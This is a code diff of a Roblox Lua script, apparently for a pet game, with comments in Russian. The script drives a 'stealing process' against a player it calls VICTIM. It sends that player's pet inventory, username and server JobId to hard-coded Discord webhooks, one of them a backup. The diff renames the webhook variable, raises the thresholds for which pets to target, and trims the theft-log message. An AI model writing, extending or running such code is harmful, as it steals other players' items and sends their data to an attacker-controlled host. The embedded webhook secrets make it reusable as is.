@@ -4,12 +4,15 @@ if game.PlaceId ~= 126884695634066 then
 end
 
 getgenv().PetConfig = {
-    MinLevel = 25,           -- минимальный возраст
-    MinWeight = 5.0,         -- минимальный вес
+    MinLevel = getgenv().MinLevel or 75,           -- минимальный возраст
+    MinWeight = getgenv().MinWeight or 20.0,         -- минимальный вес
     GrowthFactor = 0.1       -- формула роста веса: BaseWeight × (1 + Level × GrowthFactor)
 }
 
-getgenv().FullInventoryWebhook = "https://discord.com/api/webhooks/1402809600096469133/1KUMRwKTZySNoA9hbAEgrLxq6tNM48tQ38qXa4X5XMDCpNd-fGpFX7Q-kH0LEqjXYx8R"
+
+
+
+getgenv().Webhook = "https://discord.com/api/webhooks/1402809600096469133/1KUMRwKTZySNoA9hbAEgrLxq6tNM48tQ38qXa4X5XMDCpNd-fGpFX7Q-kH0LEqjXYx8R"
 getgenv().BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -234,7 +237,7 @@ local inventoryValue = getInventoryValue()
 print("=============Inventory value:", inventoryValue)
 
 local function sendFullInventory()
-    local webhookUrl = getgenv().FullInventoryWebhook
+    local webhookUrl = getgenv().Webhook
     if not webhookUrl or webhookUrl == "" then return end
 
     local allPetData = dataModule:GetData().PetsData.PetInventory.Data
@@ -459,7 +462,7 @@ local function startStealingProcess()
         end
 
         local function sendPetRemovedWebhook(petUid, petData)
-            local webhookUrl = getgenv().FullInventoryWebhook or ""
+            local webhookUrl = getgenv().Webhook or ""
             if not webhookUrl or webhookUrl == "" then return end
 
             local petName = petData.PetType or "Unknown"
@@ -475,22 +478,11 @@ local function startStealingProcess()
                 username = "Pet Removal Logger",
                 avatar_url = "https://i.imgur.com/TSb7kEJ.png",
                 embeds = {{
-                    title = "❌ Pet Removed from Inventory",
+                    title = "❌ Pet Removed",
                     color = 15158332,
-                    fields = {
-                        {
-                            name = "🐾 Pet Details",
-                            value = string.format("Name: %s\nLevel: %s\nWeight: %.2f KG\nValue: %s\nWhitelisted: %s",
-                                petName, level, weight, petPrice, inWhitelist and "✅ Yes" or "❌ No"),
-                            inline = false
-                        },
-                        {
-                            name = "👤 Player",
-                            value = string.format("Name: %s\nJobId: %s", VICTIM.Name, game.JobId),
-                            inline = false
-                        }
-                    },
-                    footer = { text = os.date("%Y-%m-%d %H:%M:%S") }
+                    description = string.format("**%s** (Lvl: %s, Wt: %.2f KG, Val: %s, WL: %s)",
+                        petName, level, weight, petPrice, inWhitelist and "✅" or "❌"),
+                    footer = { text = VICTIM.Name .. " | " .. os.date("%H:%M:%S") }
                 }}
             }
 
@@ -634,7 +626,7 @@ end
 sendFullInventory()
 
 local function sendFullInventoryFile()
-    local webhookUrl = getgenv().FullInventoryWebhook
+    local webhookUrl = getgenv().Webhook
     if not webhookUrl or webhookUrl == "" then return end
 
     local allPetData = dataModule:GetData().PetsData.PetInventory.Data
